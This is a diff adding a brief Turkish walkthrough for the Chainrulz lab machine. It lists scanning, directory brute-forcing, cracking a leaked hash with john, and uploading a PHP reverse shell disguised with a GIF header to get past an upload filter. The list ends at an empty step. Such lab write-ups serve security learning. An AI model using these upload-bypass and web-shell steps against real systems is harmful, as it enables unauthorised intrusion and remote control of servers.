@@ -1,0 +1,13 @@
+CHAİNRULZ MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.131 bulundu.
+2 - nmap -A -p- 192.168.2.131
+3 - gobuster dir -u http://192.168.2.131:8011/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+4 - wget http://192.168.2.131/index.html.bak
+5 - cat index.html.bak
+6 - john hash -w=/usr/share/wordlists/rockyou.txt, frank : frank!!!
+7 - http://192.168.2.131/development/uploader
+8 - cp /usr/share/webshells/php/php-reverse-shell.php .
+9 - GIF98 -> php-reverse-shell.php
+10 - cp php-reverse-shell.php php-gif-shell.php.gif
+11 - http://192.168.2.131/development/uploader/FRANKuploads/
+12 - 
